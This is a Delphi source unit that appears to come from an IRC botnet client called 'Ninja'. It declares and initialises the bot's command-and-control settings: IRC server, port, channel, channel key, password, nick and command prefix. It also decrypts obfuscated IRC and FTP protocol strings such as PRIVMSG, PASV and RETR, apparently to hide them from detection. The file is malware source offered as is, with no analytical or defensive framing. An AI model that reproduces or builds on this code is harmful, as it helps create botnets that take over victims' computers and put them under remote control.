Unit untGlobalDeclare;

Interface

Uses
  Windows,
  untFunctions,
  untSockets,
  untCrypt;

  {$I Ninja.ini}

Var
  g_irc_host    :string;
  g_irc_port    :integer;
  g_irc_channel :string;
  g_irc_honeypot:string;
  g_irc_key     :string;
  g_irc_pass    :string;
  g_irc_nick    :string;
  g_irc_ident   :string;
  g_irc_prefix  :string;
  g_bot_name    :string;
//  g_bot_version :string;

  c_key         :integer;
  c_privmsg     :string;
  c_user        :string;
  c_nick        :string;
  c_quit        :string;
  c_join        :string;
  c_part        :string;
  c_userhost    :string;
  c_pass        :string;
  c_type        :string;
  c_pasv        :string;
  c_port        :string;
  c_retr        :string;

  mutexhandleg  :thandle;

  Procedure InitializeSettings;

Implementation

//uses
//  untNetbios;

Procedure InitializeSettings;
Begin
  randomize();

  c_key         := c_crypt_key;

  {$IFDEF USE_CRYPTED_IRCSETTINGS}
    g_irc_host    := ninja_dns(pchar(crypt(_c_irc_host, c_key)));
    g_irc_port    := strtoint(crypt(_c_irc_port, c_key));
    g_irc_channel := crypt(_c_irc_channel, c_key);
    g_irc_honeypot:= crypt(_c_irc_honeypot, c_key);
    g_irc_key     := crypt(_c_irc_key, c_key);
    g_irc_pass    := crypt(_c_irc_pass, c_key);
    g_irc_nick    := crypt(_c_irc_nick, c_key);
    g_irc_ident   := crypt(_c_irc_ident, c_key);
    g_irc_prefix  := crypt(_c_irc_prefix, c_key);
  {$ELSE}
    g_irc_host    := ninja_dns(pchar(_c_irc_host));
    g_irc_port    := strtoint(_c_irc_port);
    g_irc_channel := _c_irc_channel;
    g_irc_honeypot:= _c_irc_honeypot;
    g_irc_key     := _c_irc_key;
    g_irc_pass    := _c_irc_pass;
    g_irc_nick    := _c_irc_nick;
    g_irc_ident   := _c_irc_ident;
    g_irc_prefix  := _c_irc_prefix;
  {$ENDIF}

  g_bot_name    := c_bot_name;
//  g_bot_version := c_bot_version;

  c_privmsg     := crypt(c_crypt_privmsg, c_key);
  c_user        := crypt(c_crypt_user, c_key);
  c_nick        := crypt(c_crypt_nick, c_key);
  c_quit        := crypt(c_crypt_quit, c_key);
  c_join        := crypt(c_crypt_join, c_key);
  c_part        := crypt(c_crypt_part, c_key);
  c_userhost    := crypt(c_crypt_userhost, c_key);
  c_pass        := crypt(c_crypt_pass, c_key);
  c_type        := crypt(c_crypt_type, c_key);
  c_pasv        := crypt(c_crypt_pasv, c_key);
  c_port        := crypt(c_crypt_port, c_key);
  c_retr        := crypt(c_crypt_retr, c_key);

  socket_startup;
//  initnetapifunctions;
End;

End.
